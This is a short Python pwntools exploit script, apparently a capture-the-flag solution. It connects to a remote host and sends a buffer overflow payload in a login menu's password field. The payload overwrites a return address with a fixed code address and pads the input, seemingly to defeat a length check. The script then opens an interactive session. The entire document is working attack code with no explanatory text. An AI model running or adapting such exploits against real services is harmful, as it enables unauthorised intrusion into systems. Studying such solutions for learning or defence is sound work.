from pwn import *

p = remote('220.249.52.133','45360')
addr = 0x08048694
payload = 'a'*(0x14+0x4)+p32(addr)+'a'*(256-0x18)

p.sendlineafter('Your choice:','1')
p.sendlineafter('username:','123')
p.sendlineafter('passwd:',payload)
p.interactive()
